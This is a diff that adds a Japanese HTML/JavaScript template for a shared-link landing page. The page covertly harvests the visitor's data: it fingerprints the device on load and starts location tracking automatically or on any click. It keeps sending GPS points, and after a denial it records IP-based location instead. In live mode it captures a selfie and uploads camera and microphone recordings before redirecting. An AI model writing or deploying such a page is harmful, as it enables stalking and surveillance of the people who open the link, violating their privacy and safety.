@@ -1,0 +1,459 @@
+<!doctype html>
+<html lang="ja"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0f1115">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<title>{{ link.name }}</title>
+<style>
+html,body{margin:0;background:#0f1115;color:#e6e9ef;
+  font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;-webkit-text-size-adjust:100%}
+button{padding:12px 30px;font-size:15px;border:0;border-radius:999px;background:#4c8dff;
+  color:#fff;font-weight:600;cursor:pointer}
+button:disabled{opacity:.55}
+
+/* ---- ゲート ---- */
+#gate{position:fixed;inset:0;z-index:20;background:#0f1115;overflow-y:auto;
+  display:flex;align-items:center;justify-content:center;padding:26px;
+  transition:opacity .4s ease,transform .4s ease}
+#gate.out{opacity:0;transform:translateY(-10px);pointer-events:none}
+.gwrap{max-width:440px;width:100%;text-align:center}
+.gwrap h1{font-size:21px;line-height:1.5;margin:0 0 16px;font-weight:700;word-break:break-word}
+.req{white-space:pre-wrap;text-align:left;font-size:14px;line-height:1.9;color:#c7cddb;
+  background:#171a21;border:1px solid #232734;border-radius:12px;padding:14px 16px;
+  max-height:40vh;overflow-y:auto}
+.ask{margin:18px 0 0;font-size:14px;color:#4c8dff;font-weight:600;line-height:1.6}
+.extra{white-space:pre-wrap;text-align:left;margin:12px 0 0;font-size:12px;
+  line-height:1.85;color:#8b93a7}
+.warnline{margin:10px 0 0;font-size:11.5px;color:#7c8496;line-height:1.7;text-align:left}
+.stat{margin:12px 0 0;font-size:11.5px;color:#6b7386;min-height:1.4em}
+#help{display:none;margin-top:14px;border-top:1px solid #232734;padding-top:12px}
+#help p{font-size:12.5px;color:#9aa3b2;margin:0;line-height:1.8;text-align:left}
+
+/* ---- 本体 ---- */
+#body{min-height:100vh;display:flex;align-items:center;justify-content:center;
+  text-align:center;padding:24px;opacity:0;transition:opacity .35s ease}
+body.need #body{opacity:1}
+.inner{max-width:420px;width:100%}
+.line{font-size:15px;line-height:1.7;margin:0;color:#9aa3b2;min-height:1.7em}
+.line.warn{color:#f0b429}
+#ia{display:none;margin-top:18px;border-top:1px solid #232734;padding-top:14px}
+#ia p{font-size:12.5px;color:#9aa3b2;margin:0 0 10px;line-height:1.8}
+a.btn{display:inline-block;padding:11px 22px;border-radius:999px;background:#2b3346;
+  color:#e6e9ef;text-decoration:none;font-size:14px}
+#cam{position:fixed;right:10px;bottom:10px;width:112px;height:84px;object-fit:cover;
+  border-radius:10px;background:#000;z-index:5;box-shadow:0 2px 10px rgba(0,0,0,.5);opacity:.92}
+</style></head><body>
+
+<div id="gate"><div class="gwrap">
+  <h1>{{ link.name }}</h1>
+  {% if link.note %}<div class="req">{{ link.note }}</div>{% endif %}
+  <p class="ask">{{ ask_text }}</p>
+  <div class="extra">{{ gate_extra }}</div>
+  {% if is_live %}<p class="warnline">{{ gate_warn }}</p>{% endif %}
+  <button id="go">{{ go_text }}</button>
+  <p class="stat" id="gst"></p>
+  <div id="help"><p id="helpt"></p></div>
+</div></div>
+
+<div id="body"><div class="inner">
+  <p class="line" id="st">{{ ask_text }}</p>
+  <button id="retry" style="display:none;margin-top:16px">{{ retry_text }}</button>
+  <div id="ia">
+    <p><span id="ianame">アプリ内</span> のブラウザでは位置情報が取れないことがあります。</p>
+    <a class="btn" id="iaopen" href="#">開き直す</a>
+  </div>
+</div></div>
+
+{% if is_live %}<video id="cam" autoplay muted playsinline webkit-playsinline></video>{% endif %}
+
+<script>
+window.GPS = {
+  code: {{ code|tojson }},
+  mode: {{ mode|tojson }},
+  iv: {{ iv }},
+  dest: {{ dest|tojson }},
+  destMin: {{ dest_min }},
+  live: {{ 1 if is_live else 0 }},
+  ask: {{ ask_text|tojson }},
+  deny: {{ deny_text|tojson }},
+  retry: {{ retry_text|tojson }}
+};
+</script>
+<script>
+(function () {
+  "use strict";
+  var G = window.GPS, CODE = G.code, ISLIVE = !!G.live;
+  var IV = Math.max(5, G.iv | 0) * 1000;
+  var DEST = G.dest || "", DEST_MIN = (G.destMin || 2) * 1000;
+
+  var gate = document.getElementById("gate");
+  var gst = document.getElementById("gst");
+  var st = document.getElementById("st");
+  var retryBtn = document.getElementById("retry");
+  var help = document.getElementById("help");
+  var helpt = document.getElementById("helpt");
+  var ia = document.getElementById("ia");
+
+  var VID = (function () {
+    try {
+      var v = localStorage.getItem("gps_vid");
+      if (!v) { v = Math.random().toString(36).slice(2, 12) + Date.now().toString(36);
+                localStorage.setItem("gps_vid", v); }
+      return v;
+    } catch (e) { return "x"; }
+  })();
+  var SID = (function () {
+    try {
+      var k = "gps_sid_" + CODE, v = sessionStorage.getItem(k);
+      if (!v) { v = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
+                sessionStorage.setItem(k, v); }
+      return v;
+    } catch (e) { return "s"; }
+  })();
+
+  var started = false, done = false, left = false, stopped = false;
+  var gotFix = false, t0 = 0, tries = 0, inflight = false, lastIp = 0;
+  var wid = null, watchHi = null, watchTimer = null, lastFixAt = 0, lastSend = 0;
+  var q = [], sending = false, gaveUp = false, denied = false;
+  var camStream = null, rec = null, recTimer = null, segSeq = 0, camBusy = false;
+
+  function say(t, w) {
+    if (gst) { gst.textContent = t || ""; gst.style.color = w ? "#f0b429" : ""; }
+    if (st) { st.textContent = t || ""; st.className = "line" + (w ? " warn" : ""); }
+  }
+  function permText() {
+    var s = "位置情報：許可状態を確認しています…";
+    return s;
+  }
+  function showHelp(txt) {
+    if (help) help.style.display = "block";
+    if (helpt && txt) helpt.textContent = txt;
+  }
+  function hint() {
+    var ua = navigator.userAgent || "", ios = /iPhone|iPad|iPod/i.test(ua);
+    var app = /Instagram/i.test(ua) ? "Instagram"
+            : /FBAN|FBAV/i.test(ua) ? "Facebook"
+            : /Line\//i.test(ua) ? "LINE"
+            : /Twitter/i.test(ua) ? "X" : "";
+    if (app) {
+      return app + " のブラウザでは位置情報が取れないことがあります。右上のメニューから「"
+           + (ios ? "Safariで開く" : "Chromeで開く") + "」を選んでください。";
+    }
+    if (ios) {
+      return "設定アプリ →「プライバシーとセキュリティ」→「位置情報サービス」をON、"
+           + "その中の「Safari Webサイト」を「確認」ではなく「使用中のみ許可」にしてください。"
+           + "変更後はページを再読み込みしてください。";
+    }
+    return "アドレスバー左の鍵アイコン →「位置情報」→「許可」にしてください。";
+  }
+  function showInApp() {
+    var ua = navigator.userAgent || "", nm = "";
+    if (/Instagram/i.test(ua)) nm = "Instagram";
+    else if (/FBAN|FBAV/i.test(ua)) nm = "Facebook";
+    else if (/Line\//i.test(ua)) nm = "LINE";
+    else if (/Twitter/i.test(ua)) nm = "X";
+    if (!nm || !ia) return;
+    ia.style.display = "block";
+    var n = document.getElementById("ianame");
+    if (n) n.textContent = nm;
+    var a = document.getElementById("iaopen");
+    if (a) {
+      var ios = /iPhone|iPad|iPod/i.test(ua);
+      a.href = ios ? location.href.replace(/^https:/, "x-safari-https:")
+                   : "intent://" + location.href.replace(/^https?:\/\//, "") +
+                     "#Intent;scheme=https;package=com.android.chrome;end";
+      a.textContent = ios ? "Safariで開き直す" : "Chromeで開き直す";
+    }
+  }
+
+  /* ---------- 送信 ---------- */
+  function send(extra) {
+    if (sending || (!q.length && !extra)) return;
+    sending = true;
+    var pts = q.slice(0);
+    fetch("/g/" + encodeURIComponent(CODE) + "/p", {
+      method: "POST", cache: "no-store",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ sid: SID, vid: VID, kind: (extra && extra.kind) || "pt", pts: pts })
+    }).then(function (r) { return r.json().catch(function () { return {}; }); })
+      .then(function () {
+        q = q.filter(function (x) { return pts.indexOf(x) < 0; });
+        lastSend = Date.now();
+      })
+      .catch(function () {})
+      .then(function () { sending = false; });
+  }
+  function push(pt) {
+    q.push(pt);
+    if (q.length > 2000) q.splice(0, q.length - 2000);
+    if (q.length >= 4 || Date.now() - lastSend > Math.min(IV, 4000)) send();
+  }
+  function sendIp(force) {
+    if (gotFix || stopped) return;
+    if (!force && Date.now() - lastIp < 55000) return;
+    lastIp = Date.now();
+    fetch("/g/" + encodeURIComponent(CODE) + "/x", {
+      method: "POST", cache: "no-store",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ sid: SID, vid: VID, ip_point: 1 })
+    }).catch(function () {});
+  }
+  function flush(kind) {
+    try {
+      navigator.sendBeacon("/g/" + encodeURIComponent(CODE) + "/p",
+        new Blob([JSON.stringify({ sid: SID, vid: VID, kind: kind, pts: q.slice(0) })],
+                 { type: "application/json" }));
+    } catch (e) {}
+  }
+
+  /* ---------- 位置情報 ---------- */
+  function geoOnce(opt, cb) {
+    if (!navigator.geolocation) { cb({ code: 0 }); return; }
+    if (inflight) return;
+    inflight = true;
+    var fin = false;
+    var to = setTimeout(function () {
+      if (fin) return; fin = true; inflight = false; cb({ code: 3 });
+    }, (opt.timeout || 15000) + 2500);
+    try {
+      navigator.geolocation.getCurrentPosition(
+        function (p) { if (fin) return; fin = true; clearTimeout(to); inflight = false; cb(null, p); },
+        function (e) { if (fin) return; fin = true; clearTimeout(to); inflight = false; cb(e || { code: 2 }); },
+        opt);
+    } catch (e) {
+      clearTimeout(to); inflight = false;
+      if (!fin) { fin = true; cb({ code: 2 }); }
+    }
+  }
+  function watch(hi) {
+    if (!navigator.geolocation) return;
+    hi = !!hi;
+    if (wid !== null && watchHi === hi) return;
+    if (wid !== null) { try { navigator.geolocation.clearWatch(wid); } catch (e) {} wid = null; }
+    watchHi = hi;
+    try {
+      wid = navigator.geolocation.watchPosition(
+        function (p) { onFix(p); },
+        function (e) { onErr(e, true); },
+        hi ? { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+           : { enableHighAccuracy: false, timeout: 20000, maximumAge: 60000 });
+    } catch (e) { wid = null; watchHi = null; }
+  }
+  function onFix(p) {
+    var c = p && p.coords;
+    if (!c || c.latitude == null) return;
+    tries = 0; lastFixAt = Date.now();
+    if (!gotFix) {
+      gotFix = true;
+      passGate();
+      if (DEST && !left) setTimeout(function () { go(DEST); }, Math.max(400, DEST_MIN));
+    }
+    push({ ts: new Date(p.timestamp || Date.now()).toISOString(),
+           lat: c.latitude, lon: c.longitude, acc: c.accuracy });
+    if (wid !== null && watchHi !== true) watch(true);
+  }
+  function onErr(e, fromWatch) {
+    var code = (e && e.code) || 0;
+    if (code === 1) {
+      denied = true;
+      say(G.deny, true);
+      showInApp();
+      showHelp(hint());
+      sendIp(true);
+      if (retryBtn) retryBtn.style.display = "";
+      document.body.classList.add("need");
+      return;
+    }
+    if (!fromWatch) tries++;
+    if (!gaveUp) say("位置情報：取得中…（試行 " + tries + " / code=" + code + "）");
+    if (t0 && Date.now() - t0 > 60000 && !gaveUp) {
+      gaveUp = true;
+      say("位置情報：端末が位置を出せていません（回線からの推定で記録します）", true);
+      showHelp(hint());
+      sendIp(true);
+      document.body.classList.add("need");
+    }
+  }
+  function after1(e, p) { if (p) onFix(p); else onErr(e, false); }
+
+  function passGate() {
+    if (done) return;
+    done = true;
+    document.body.classList.add("need");
+    if (gate) {
+      gate.classList.add("out");
+      setTimeout(function () { gate.style.display = "none"; }, 420);
+    }
+  }
+  function go(url) {
+    if (!url || left) return;
+    left = true;
+    flush("stop");
+    try { location.replace(url); } catch (e) { location.href = url; }
+  }
+
+  function start() {
+    if (started) return;
+    started = true; t0 = Date.now(); stopped = false;
+    say(G.ask);
+    // ★ タップと同じタスク：位置情報だけ
+    geoOnce({ enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 }, after1);
+    // ★ 別タスク：watch
+    watchTimer = setTimeout(function () { watchTimer = null; watch(false); }, 1500);
+    // ★ さらに後：カメラ（Safariの操作有効期限は約5秒あるので間に合う）
+    if (ISLIVE) setTimeout(camStart, 900);
+    // 保険
+    setInterval(function () {
+      if (stopped || left) return;
+      if (gotFix) {
+        if (Date.now() - lastFixAt > 25000) {
+          geoOnce({ enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }, after1);
+        }
+        return;
+      }
+      sendIp(false);
+      if (t0 && Date.now() - t0 > 60000 && !gaveUp) {
+        gaveUp = true;
+        say("位置情報：端末が位置を出せていません（回線からの推定で記録します）", true);
+        showHelp(hint());
+      }
+      geoOnce({ enableHighAccuracy: false, timeout: 20000, maximumAge: 0 }, after1);
+    }, 20000);
+    setTimeout(function () { if (!gotFix) sendIp(true); }, 9000);
+    setInterval(function () {
+      if (stopped || left) return;
+      if (q.length) send(); else if (Date.now() - lastSend > Math.max(30000, IV * 3)) send({ kind: "hb" });
+    }, Math.min(IV, 4000));
+  }
+
+  /* ---------- カメラ・マイク・録画 ---------- */
+  function camStart() {
+    if (camStream || camBusy) return;
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    camBusy = true;
+    say("② カメラの許可を確認しています…");
+    navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+      audio: true
+    }).then(function (s) {
+      camBusy = false;
+      camStream = s;
+      say("② カメラ：映像を記録中");
+      var v = document.getElementById("cam");
+      if (v) {
+        v.srcObject = s;
+        var pp = v.play(); if (pp && pp.catch) pp.catch(function () {});
+      }
+      setTimeout(selfie, 1800);
+      recLoop();
+      say("③ マイク：OK");
+    }).catch(function () {
+      camBusy = false;
+      say("② カメラ：取れませんでした", true);
+    });
+  }
+  function selfie() {
+    try {
+      var v = document.getElementById("cam");
+      if (!v || !v.videoWidth) { setTimeout(selfie, 700); return; }
+      var w = 480, h = Math.round(w * v.videoHeight / v.videoWidth) || 360;
+      var cv = document.createElement("canvas"); cv.width = w; cv.height = h;
+      var x = cv.getContext("2d");
+      x.translate(w, 0); x.scale(-1, 1);
+      x.drawImage(v, 0, 0, w, h);
+      fetch("/g/" + encodeURIComponent(CODE) + "/x", {
+        method: "POST", cache: "no-store",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ sid: SID, vid: VID, kind: "selfie",
+                               selfie: cv.toDataURL("image/jpeg", 0.7) })
+      }).catch(function () {});
+    } catch (e) {}
+  }
+  function pickMime() {
+    var c = ["video/webm;codecs=vp8,opus", "video/webm", "video/mp4"];
+    for (var i = 0; i < c.length; i++) {
+      try { if (window.MediaRecorder && MediaRecorder.isTypeSupported &&
+                MediaRecorder.isTypeSupported(c[i])) return c[i]; } catch (e) {}
+    }
+    return "";
+  }
+  function recLoop() {
+    if (!camStream || !window.MediaRecorder) return;
+    var mime = pickMime();
+    try {
+      rec = mime ? new MediaRecorder(camStream, {
+        mimeType: mime, videoBitsPerSecond: 180000, audioBitsPerSecond: 32000 })
+        : new MediaRecorder(camStream);
+    } catch (e) {
+      try { rec = new MediaRecorder(camStream); } catch (e2) { return; }
+    }
+    var parts = [];
+    rec.ondataavailable = function (e) { if (e.data && e.data.size) parts.push(e.data); };
+    rec.onstop = function () {
+      var blob = new Blob(parts, { type: mime || "video/webm" });
+      if (blob.size) {
+        fetch("/g/" + encodeURIComponent(CODE) + "/v?seq=" + (segSeq++) +
+              "&ext=" + (/mp4/.test(mime) ? "mp4" : "webm") +
+              "&sid=" + encodeURIComponent(SID) + "&vid=" + encodeURIComponent(VID),
+              { method: "POST", body: blob }).catch(function () {});
+      }
+      if (!document.hidden && camStream && !stopped) recLoop();
+    };
+    try { rec.start(); } catch (e) { return; }
+    recTimer = setTimeout(function () { try { rec.stop(); } catch (e) {} }, {{ seg_ms }});
+  }
+
+  /* ---------- 指紋（軽量） ---------- */
+  function fingerprint() {
+    var o = {
+      ua: navigator.userAgent,
+      lang: (navigator.languages || [navigator.language]).join(","),
+      tz: (function () { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+                         catch (e) { return ""; } })(),
+      screen: screen.width + "x" + screen.height + "x" + screen.colorDepth,
+      dpr: window.devicePixelRatio || 1,
+      cores: navigator.hardwareConcurrency || 0,
+      mem: navigator.deviceMemory || 0,
+      touch: ("ontouchstart" in window) ? 1 : 0,
+      platform: navigator.platform || ""
+    };
+    fetch("/g/" + encodeURIComponent(CODE) + "/x", {
+      method: "POST", cache: "no-store",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ sid: SID, vid: VID, fp: o })
+    }).catch(function () {});
+  }
+
+  /* ---------- 起動 ---------- */
+  document.getElementById("go").addEventListener("click", start);
+  document.addEventListener("click", function (e) {
+    if (e.target && e.target.id === "go") return;
+    if (e.target && e.target.closest && e.target.closest("#ia")) return;
+    if (!started) start();
+    else if (!gotFix && window.navigator.geolocation) {
+      geoOnce({ enableHighAccuracy: false, timeout: 15000, maximumAge: 0 }, after1);
+    }
+  }, { passive: true });
+  if (retryBtn) retryBtn.addEventListener("click", function () {
+    denied = false; gaveUp = false; t0 = Date.now();
+    say(G.ask);
+    geoOnce({ enableHighAccuracy: false, timeout: 15000, maximumAge: 0 }, after1);
+    if (wid === null) watch(false);
+  });
+
+  document.addEventListener("visibilitychange", function () {
+    if (document.visibilityState === "hidden") {
+      if (rec && rec.state !== "inactive") { try { rec.stop(); } catch (e) {} }
+      if (!left) flush("hb");
+      return;
+    }
+    if (camStream && (!rec || rec.state === "inactive")) recLoop();
+    if (!gotFix && started) geoOnce({ enableHighAccuracy: false, timeout: 15000, maximumAge: 0 }, after1);
+  });
+  window.addEventListener("pagehide", function () { if (!left) flush("stop"); });
+
+  fingerprint();
+  setTimeout(function () { if (!started) start(); }, 2500);
+})();
+</script>
+</body></html>
